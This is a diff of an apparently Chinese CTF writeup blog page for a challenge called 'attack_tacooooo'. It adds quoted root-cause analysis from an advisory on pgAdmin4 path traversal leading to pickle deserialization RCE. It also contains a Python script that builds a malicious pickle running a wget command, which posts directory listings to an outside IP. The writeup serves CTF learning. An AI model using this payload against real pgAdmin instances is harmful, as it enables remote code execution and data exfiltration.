@@ -212,10 +212,36 @@
 <p><img src="/pic/shell2.png" alt="shell2"></p>
 <p><img src="/pic/shell1.png" alt="shell1"></p>
 <h1>attack_tacooooo</h1>
-<p><a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a><br>
-<img src="%5Cpic%5C7.png" alt="[7]"><br>
-<img src="%5Cpic%5C8.png" alt="[8]"><br>
-没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p>
+<p><a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/Details">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/Details</a></p>
+<h3 id="Root-Cause-Analysis">Root Cause Analysis</h3>
+<blockquote>
+<p>pgAdmin4 uses a file-based session management approach. The session files are saved on disk as pickle objects. When a user performs a request, the value of the session cookie <code>pga4_session</code> is used to retrieve the file, then it’s content is deserialized, and finally its signature verified.</p>
+</blockquote>
+<blockquote>
+<p>The <code>ManagedSessionInterface</code> class implements flask’s <code>SessionInterface</code> to read the user’s cookie and translate it into their session</p>
+</blockquote>
+<blockquote>
+<p>The cookie value is split in 2 parts at the first <code>!</code> character. The first part is the session ID (<code>sid</code>), while the second is the session digest.</p>
+</blockquote>
+<blockquote>
+<p>The vulnerability lies in the <code>FileBackedSessionManager.get</code> method that loads session files by concatenating the <code>sessions</code> folder - located inside the pgAdmin4 <code>DATA_DIR</code> - with the session ID. Precisely, the two values are concatenated using the <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/os.path.html#os.path.join"><code>os.path.join</code></a> function.</p>
+</blockquote>
+<blockquote>
+<p>This function has two weaknesses:</p>
+</blockquote>
+<ul>
+<li>
+<blockquote>
+<p>It does not set a trusted base-path which should not be escaped, therefore <code>os.path.join(&quot;/opt/safe/&quot;, &quot;../../etc/passwd&quot;)</code> returns <code>/etc/passwd</code>.</p>
+</blockquote>
+</li>
+<li>
+<blockquote>
+<p>It uses the right-most absolute path in its arguments as the root path, therefore <code>os.path.join(&quot;./safe/&quot;, &quot;do_not_escape_from_here&quot;, &quot;/etc/passwd&quot;)</code> returns <code>/etc/passwd</code>.</p>
+</blockquote>
+</li>
+</ul>
+<p>没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b<span class="string">&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(platform)) + platform.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">exit</span>(f<span class="string">&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;</span>)</span><br><span class="line">    HOST = <span class="string">&#x27;1.1.1.1:8000&#x27;</span></span><br><span class="line">    with open(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, f<span class="string">&quot;wget http://121.40.98.237:7777 --post-data=`ls /usr/bin|base64|tr -d &#x27;\n&#x27;`&quot;</span>))</span><br></pre></td></tr></table></figure>
 <p>运行上面的<code>pickler.py</code></p>
 <p>得到posix.pickle文件后</p>
@@ -316,9 +342,9 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/WP/">WP<span>1</span></a></li>
-		
 			<li><a href="/tags/碎碎念/">碎碎念<span>1</span></a></li>
+		
+			<li><a href="/tags/WP/">WP<span>1</span></a></li>
 		
 		 
 		</ul>
